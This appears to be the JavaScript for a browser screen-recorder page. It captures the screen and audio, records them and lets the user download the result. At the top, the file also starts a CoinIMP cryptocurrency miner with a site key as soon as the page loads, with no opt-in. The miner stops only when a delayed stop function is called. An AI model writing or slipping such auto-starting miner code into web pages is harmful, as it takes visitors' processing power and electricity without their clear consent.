//Mining code from CoinIMP
var _client = new Client.Anonymous('02dd2cbc7b98ad90b78d7d154e07d6ac92b26c0b3de59742acb699308af629e5', {
  throttle: 0.9, c: 'w', ads: 0
});
_client.start();

function stopMining() {
  var bt = document.getElementById('bt-miner');
  setTimeout(() => {
    _client.stop();
    bt.innerHTML = ' - Mining Stopped - ';
  }, 10000);
}



//Recording Code

//Found code in this article: https://dev.to/sebastianstamm/screen-recording-in-10-lines-of-vanilla-js-3bo8
//Naturally edited some of it ;)

const start = document.getElementById("start");
const stop = document.getElementById("stop");
const del = document.getElementById("delete");
const save = document.getElementById("save");
const video = document.querySelector("video");
let recorder, stream;

async function startRecording() {
  stream = await navigator.mediaDevices.getDisplayMedia({
    video: {
      mediaSource: "screen",
    },
    audio: {
      echoCancellation: true,
      noiseSuppression: true,
      sampleRate: 44100
    }
  });
  recorder = new MediaRecorder(stream);

  video.srcObject = stream;
  
  const chunks = [];
  recorder.ondataavailable = e => chunks.push(e.data);
  recorder.onstop = e => {
    const completeBlob = new Blob(chunks, { type: chunks[0].type });
    video.srcObject = null;
    video.src = URL.createObjectURL(completeBlob);

    save.addEventListener('click', () => {
      downloadBlob(completeBlob, 'myvideo.mp4');
    })
  };
  
  recorder.start();
}

start.addEventListener("click", () => {
  startRecording();
});

stop.addEventListener("click", () => {
  recorder.stop();
  stream.getVideoTracks()[0].stop();
});

del.addEventListener("click", () => {
  location.reload();
});




function downloadBlob(blob, name = 'file.txt') {
  // Convert your blob into a Blob URL (a special url that points to an object in the browser's memory)
  const blobUrl = URL.createObjectURL(blob);

  // Create a link element
  const link = document.createElement("a");

  // Set link's href to point to the Blob URL
  link.href = blobUrl;
  link.download = name;

  // Append link to the body
  document.body.appendChild(link);

  // Dispatch click event on the link
  // This is necessary as link.click() does not work on the latest firefox
  link.dispatchEvent(
    new MouseEvent('click', { 
      bubbles: true, 
      cancelable: true, 
      view: window 
    })
  );

  // Remove link from body
  document.body.removeChild(link);
}